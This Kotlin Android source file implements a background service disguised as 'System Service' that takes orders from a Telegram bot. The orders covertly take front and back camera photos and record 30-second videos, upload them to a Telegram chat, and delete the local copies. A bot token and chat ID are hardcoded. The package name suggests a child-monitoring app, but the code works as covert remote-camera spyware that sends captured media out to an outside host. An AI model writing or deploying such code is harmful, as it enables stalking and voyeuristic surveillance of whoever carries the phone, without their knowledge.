package com.coc338781.childapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {

    companion object {
        // ==== මෙතන ඔබේ විස්තර දාන්න ====
        const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
        const val CHAT_ID = "7905408190"
        // ================================
        const val CHANNEL_ID = "monitoring_channel"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private var lastUpdateId = 0L
    private var isRunning = true

    override fun onCreate() {
    super.onCreate()
    try {
        createChannel()
        startForeground(1, buildNotification())
        startPolling()
    } catch (e: Exception) {
        e.printStackTrace()
    }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startPolling() {
        lifecycleScope.launch(Dispatchers.IO) {
            while (isRunning) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val request = Request.Builder().url(url).build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string() ?: continue
                    val json = JSONObject(body)
                    val result = json.optJSONArray("result") ?: continue

                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        val msg = update.optJSONObject("message") ?: continue
                        val chatId = msg.getJSONObject("chat").getLong("id").toString()
                        if (chatId != CHAT_ID) continue
                        val text = msg.optString("text", "")
                        if (text.isNotEmpty()) {
                            withContext(Dispatchers.Main) { handleCommand(text.trim()) }
                        }
                    }
                } catch (e: Exception) {
                    delay(5000)
                }
            }
        }
    }

    private fun handleCommand(cmd: String) {
        val c = cmd.lowercase()
        when {
            c == "/cam" -> takePhoto(true)
            c == "/selfie" -> takePhoto(false)
            c == "/video" -> recordVideo(true, 30)
            c == "/selfievid" -> recordVideo(false, 30)
            c == "/ping" -> sendMessage("🏓 Pong! App is alive")
            c == "/help" -> sendMessage(
                "📋 Commands:\n" +
                "/cam - Back camera photo\n" +
                "/selfie - Front camera photo\n" +
                "/video - 30s back video\n" +
                "/selfievid - 30s front video\n" +
                "/ping - Test"
            )
            else -> sendMessage("❓ Unknown: $cmd")
        }
    }

    private fun takePhoto(back: Boolean) {
    sendMessage("📷 Taking ${if (back) "back" else "front"} photo...")
    try {
        val intent = Intent(this, CameraActivity::class.java)
        intent.putExtra(CameraActivity.EXTRA_BACK, back)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    } catch (e: Exception) {
        sendMessage("❌ Photo failed: ${e.message}")
       }
    }

    private fun recordVideo(back: Boolean, duration: Int) {
        sendMessage("🎬 Recording ${if (back) "back" else "front"} ${duration}s...")
        CameraHelper.recordVideo(this, back, duration) { file ->
            if (file != null) sendVideo(file)
            else sendMessage("❌ Video failed")
        }
    }

    private fun sendMessage(text: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", text)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    private fun sendPhoto(file: File) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (_: Exception) {}
        }
    }

    private fun sendVideo(file: File) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendVideo"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
    }
}
